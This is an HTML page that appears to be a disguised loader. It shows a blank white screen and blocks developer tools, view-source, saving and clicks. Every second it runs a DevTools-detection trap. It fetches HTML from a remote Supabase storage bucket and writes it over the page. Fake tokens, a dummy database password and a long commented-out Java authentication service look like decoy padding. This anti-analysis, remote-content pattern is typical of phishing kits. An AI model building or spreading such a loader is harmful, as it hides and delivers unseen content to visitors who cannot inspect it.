
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title></title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: white;
    }
  </style>
</head>
<body>
  <script>
      document.addEventListener('keydown', function (e) {
    // Disable F12
    if (e.key === 'F12') {
      e.preventDefault();
    }

    // Disable Ctrl+Shift+I / J / C / K (Dev Tools, Console, Style Editor)
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && ['I', 'J', 'C', 'K'].includes(e.key.toUpperCase())) {
      e.preventDefault();
    }

    // Disable Ctrl+U (View source)
    if ((e.ctrlKey || e.metaKey) && e.key.toUpperCase() === 'U') {
      e.preventDefault();
    }

    // Disable Ctrl+S (Save Page)
    if ((e.ctrlKey || e.metaKey) && e.key.toUpperCase() === 'S') {
      e.preventDefault();
    }

    // Disable Ctrl+Shift+M (Responsive Design Mode in Firefox)
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key.toUpperCase() === 'M') {
      e.preventDefault();
    }
  });

  // Very basic DevTools detection (can be bypassed)
  const detectDevTools = () => {
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: function () {
        alert('DevTools is blocked!');
        throw new Error("DevTools is blocked!");
      }
    });
    console.log(element);
  };
  setInterval(detectDevTools, 1000);
    
    // authentication system
    const Auth = {
      token: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
      apiKey: "sb-ojukwyufdherivfwzwfk-auth-token-",
      userId: "user_12345",
      sessionId: "sess_abcdef123456"
    };
    
    // database connection
    const DB = {
      host: "localhost",
      port: 5432,
      database: "enterprise_db",
      username: "admin",
      password: "secret123",
      ssl: true,
      connectionPool: {
        min: 2,
        max: 10
      }
    };
    
    //  security headers
    const Headers = {
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      'X-XSS-Protection': '1; mode=block',
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
      'Content-Security-Policy': "default-src 'self'"
    };
    
    (async () => {
      try {
        const url = "https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/video//logo.html"; 

        const res = await fetch(url);
        if (!res.ok) throw new Error("File not found");

        const html = await res.text();
        document.open(); // clear the page
        document.write(html); // inject your real HTML
        document.close();
      } catch (e) {
        // Stay on blank white screen if failed
      }
    })();
      document.addEventListener('contextmenu', event => event.preventDefault());

  // Optional: Disable left click on the entire document
  document.addEventListener('click', event => {
    // Prevent all left-clicks (optional)
    event.preventDefault();
  });

  // Disable keyboard shortcuts for dev tools

    //  Java-style code that doesn't execute
    /*
    public class UserAuthenticationService {
        private static final String JWT_SECRET = "mySecretKey123456789";
        private static final long TOKEN_EXPIRATION = 86400000; // 24 hours
        
        @Autowired
        private UserRepository userRepository;
        
        @Autowired
        private PasswordEncoder passwordEncoder;
        
        public AuthenticationResponse authenticate(LoginRequest request) {
            try {
                User user = userRepository.findByUsername(request.getUsername());
                if (user == null) {
                    throw new BadCredentialsException("Invalid username or password");
                }
                
                if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
                    throw new BadCredentialsException("Invalid username or password");
                }
                
                String token = generateToken(user);
                return new AuthenticationResponse(token, user.getRole());
            } catch (Exception e) {
                throw new AuthenticationException("Authentication failed", e);
            }
        }
        
        private String generateToken(User user) {
            Date expirationDate = new Date(System.currentTimeMillis() + TOKEN_EXPIRATION);
            
            return Jwts.builder()
                    .setSubject(user.getUsername())
                    .setIssuedAt(new Date())
                    .setExpiration(expirationDate)
                    .signWith(SignatureAlgorithm.HS512, JWT_SECRET)
                    .compact();
        }
        
        public boolean validateToken(String token) {
            try {
                Jwts.parser().setSigningKey(JWT_SECRET).parseClaimsJws(token);
                return true;
            } catch (JwtException | IllegalArgumentException e) {
                return false;
            }
        }
    }
    
    @Entity
    @Table(name = "users")
    public class User {
        @Id
        @GeneratedValue(strategy = GenerationType.IDENTITY)
        private Long id;
        
        @Column(unique = true, nullable = false)
        private String username;
        
        @Column(unique = true, nullable = false)
        private String email;
        
        @Column(nullable = false)
        private String password;
        
        @Column(nullable = false)
        private String role;
        
        @Column(nullable = false)
        private Date createdAt;
        
        @Column
        private Date lastLogin;
        
        // Getters and setters
        public Long getId() { return id; }
        public void setId(Long id) { this.id = id; }
        
        public String getUsername() { return username; }
        public void setUsername(String username) { this.username = username; }
        
        public String getEmail() { return email; }
        public void setEmail(String email) { this.email = email; }
        
        public String getPassword() { return password; }
        public void setPassword(String password) { this.password = password; }
        
        public String getRole() { return role; }
        public void setRole(String role) { this.role = role; }
        
        public Date getCreatedAt() { return createdAt; }
        public void setCreatedAt(Date createdAt) { this.createdAt = createdAt; }
        
        public Date getLastLogin() { return lastLogin; }
        public void setLastLogin(Date lastLogin) { this.lastLogin = lastLogin; }
    }
    
    @RestController
    @RequestMapping("/api/auth")
    public class AuthController {
        
        @Autowired
        private UserAuthenticationService authService;
        
        @PostMapping("/login")
        public ResponseEntity<AuthenticationResponse> login(@RequestBody LoginRequest request) {
            try {
                AuthenticationResponse response = authService.authenticate(request);
                return ResponseEntity.ok(response);
            } catch (AuthenticationException e) {
                return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                    .body(new AuthenticationResponse("Authentication failed"));
            }
        }
        
        @PostMapping("/register")
        public ResponseEntity<String> register(@RequestBody RegisterRequest request) {
            try {
                User user = new User();
                user.setUsername(request.getUsername());
                user.setEmail(request.getEmail());
                user.setPassword(passwordEncoder.encode(request.getPassword()));
                user.setRole("USER");
                user.setCreatedAt(new Date());
                
                userRepository.save(user);
                return ResponseEntity.ok("User registered successfully");
            } catch (Exception e) {
                return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                    .body("Registration failed");
            }
        }
        
        @PostMapping("/logout")
        public ResponseEntity<String> logout(@RequestHeader("Authorization") String token) {
            // In a real application, you would invalidate the token
            return ResponseEntity.ok("Logged out successfully");
        }
    }
    
    @Service
    public class DatabaseService {
        
        @Autowired
        private JdbcTemplate jdbcTemplate;
        
        public List<User> getAllUsers() {
            String sql = "SELECT * FROM users WHERE active = true";
            return jdbcTemplate.query(sql, new UserRowMapper());
        }
        
        public User getUserById(Long id) {
            String sql = "SELECT * FROM users WHERE id = ?";
            return jdbcTemplate.queryForObject(sql, new UserRowMapper(), id);
        }
        
        public void updateUserLastLogin(Long userId) {
            String sql = "UPDATE users SET last_login = ? WHERE id = ?";
            jdbcTemplate.update(sql, new Date(), userId);
        }
        
        public boolean userExists(String username) {
            String sql = "SELECT COUNT(*) FROM users WHERE username = ?";
            Integer count = jdbcTemplate.queryForObject(sql, Integer.class, username);
            return count != null && count > 0;
        }
    }
    
    @Component
    public class SecurityConfig {
        
        private static final int MAX_LOGIN_ATTEMPTS = 5;
        private static final long LOCKOUT_DURATION = 900000; // 15 minutes
        
        private Map<String, Integer> loginAttempts = new ConcurrentHashMap<>();
        private Map<String, Long> lockedAccounts = new ConcurrentHashMap<>();
        
        public boolean isAccountLocked(String username) {
            Long lockTime = lockedAccounts.get(username);
            if (lockTime != null) {
                if (System.currentTimeMillis() - lockTime > LOCKOUT_DURATION) {
                    lockedAccounts.remove(username);
                    loginAttempts.remove(username);
                    return false;
                }
                return true;
            }
            return false;
        }
        
        public void recordFailedAttempt(String username) {
            int attempts = loginAttempts.getOrDefault(username, 0) + 1;
            loginAttempts.put(username, attempts);
            
            if (attempts >= MAX_LOGIN_ATTEMPTS) {
                lockedAccounts.put(username, System.currentTimeMillis());
            }
        }
        
        public void clearFailedAttempts(String username) {
            loginAttempts.remove(username);
        }
    }
    
    public class LoginRequest {
        private String username;
        private String password;
        
        public String getUsername() { return username; }
        public void setUsername(String username) { this.username = username; }
        
        public String getPassword() { return password; }
        public void setPassword(String password) { this.password = password; }
    }
    
    public class RegisterRequest {
        private String username;
        private String email;
        private String password;
        
        public String getUsername() { return username; }
        public void setUsername(String username) { this.username = username; }
        
        public String getEmail() { return email; }
        public void setEmail(String email) { this.email = email; }
        
        public String getPassword() { return password; }
        public void setPassword(String password) { this.password = password; }
    }
    
    public class AuthenticationResponse {
        private String token;
        private String role;
        private String message;
        
        public AuthenticationResponse(String token, String role) {
            this.token = token;
            this.role = role;
        }
        
        public AuthenticationResponse(String message) {
            this.message = message;
        }
        
        public String getToken() { return token; }
        public void setToken(String token) { this.token = token; }
        
        public String getRole() { return role; }
        public void setRole(String role) { this.role = role; }
        
        public String getMessage() { return message; }
        public void setMessage(String message) { this.message = message; }
    }
    */

      // Disable right click (context menu)

  </script>
</body>
</html>

